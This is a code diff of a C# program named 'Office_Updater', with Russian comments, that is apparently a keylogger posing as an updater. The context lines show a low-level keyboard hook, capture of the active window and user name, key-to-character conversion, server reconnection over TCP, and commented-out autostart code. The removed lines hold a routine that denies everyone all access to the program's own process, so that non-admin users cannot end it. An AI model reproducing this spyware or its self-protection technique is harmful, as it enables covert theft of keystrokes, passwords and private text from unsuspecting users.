@@ -7,9 +7,6 @@ using System.Text;
 using System.Diagnostics;
 using Microsoft.Extensions.Configuration;
 using SimpleTcp;
-using System.Security.AccessControl;
-using System.ComponentModel;
-using System.Security.Principal;
 
 namespace Office_Updater
 {
@@ -43,31 +40,6 @@ namespace Office_Updater
             WH_KEYBOARD_LL = 13,
             WH_MOUSE_LL = 14
         }
-
-        private enum ProcessSecurityAccessRights : int
-        {
-            DELETE = 0x00010000,
-            READ_CONTROL = 0x00020000,
-            STANDARD_RIGHTS_REQUIRED = 0x000f0000,
-            SYNCHRONIZE = 0x00100000,
-            WRITE_DAC = 0x00040000,
-            WRITE_OWNER = 0x00080000,
-            PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF),
-            PROCESS_CREATE_PROCESS = 0x0080,
-            PROCESS_CREATE_THREAD = 0x0002,
-            PROCESS_DUP_HANDLE = 0x0040,
-            PROCESS_QUERY_INFORMATION = 0x0400,
-            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
-            PROCESS_SET_INFORMATION = 0x0200,
-            PROCESS_SET_QUOTA = 0x0100,
-            PROCESS_SUSPEND_RESUME = 0x0800,
-            PROCESS_TERMINATE= 0x0001,
-            PROCESS_VM_OPERATION = 0x0008,
-            PROCESS_VM_READ= 0x0010,
-            PROCESS_VM_WRITE = 0x0020
-        }
-
-        private const int DACL_SECURITY_INFORMATION = 0x00000004;
 
         private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
 
@@ -105,13 +77,6 @@ namespace Office_Updater
 
         [DllImport("user32.dll")]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, 
-            [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);
 
 
         private static HookProc proc = HookCallback;
@@ -181,7 +146,7 @@ namespace Office_Updater
             //Добавление в автозагрузку и блокировка от пользователя без прав админа
             //if (!Autoran.IsInStartup())
             //    Autoran.RunOnStartup();
-            //ProcessBlock();
+            
             //======
 
             //Получение и запись активного окна / имя пользователя
@@ -201,8 +166,7 @@ namespace Office_Updater
                 }
             //===========
 
-            //Установка хука
-            hook = SetHook(proc);
+            hook = SetHook(proc); //Установка хука
 
             //Преехват сообщений
             while (true)
@@ -233,44 +197,6 @@ namespace Office_Updater
                 Thread.Sleep(5);
             }
         }
-        //Блокировка процесса
-        private static RawSecurityDescriptor GetSecurityDescriptor(IntPtr processHandle)
-        {
-            var psd = new byte[0];
-            GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out uint buf);
-            if (buf < 0 || buf > short.MaxValue)
-                throw new Win32Exception();
-            if (!GetKernelObjectSecurity(
-                    processHandle,
-                    DACL_SECURITY_INFORMATION,
-                    psd = new byte[buf],
-                    buf,
-                    out buf))
-                throw new Win32Exception();
-            return new RawSecurityDescriptor(psd, 0);
-        }
-        private static void SetSecurityDescriptor(IntPtr handle, RawSecurityDescriptor descriptor)
-        {
-            var rawsd = new byte[descriptor.BinaryLength];
-            descriptor.GetBinaryForm(rawsd, 0);
-            if (!SetKernelObjectSecurity(handle, DACL_SECURITY_INFORMATION, rawsd))
-                throw new Win32Exception();
-        }
-        private static void ProcessBlock()
-        {
-            IntPtr procHandle = Process.GetCurrentProcess().Handle;
-            RawSecurityDescriptor descriptor = GetSecurityDescriptor(procHandle);
-            SecurityIdentifier sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;
-
-            descriptor.DiscretionaryAcl.InsertAce(
-                0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied,
-                (int)ProcessSecurityAccessRights.PROCESS_ALL_ACCESS,
-                new SecurityIdentifier(WellKnownSidType.WorldSid, sid),
-                false,
-                null));
-            SetSecurityDescriptor(procHandle, descriptor);
-        }
-        //
 
         //Переподключение к серверу
         private static void Reconnection()
@@ -283,7 +209,7 @@ namespace Office_Updater
             }
             catch { goto Flag; }
         }
-        //
+        //====
 
         //Получение название окна
         private static bool IsActiveWindowChanged(string active)
@@ -302,7 +228,7 @@ namespace Office_Updater
             }
             return null;
         }
-        //
+        //====
 
         //Получение символа клавиши
         private static string GetCharsFromKeys(Keys keys, bool shift)
@@ -423,6 +349,6 @@ namespace Office_Updater
             }
             else return $"[{((Keys)code).ToString()}]";
         }
-        //
+        //====
     }
 }
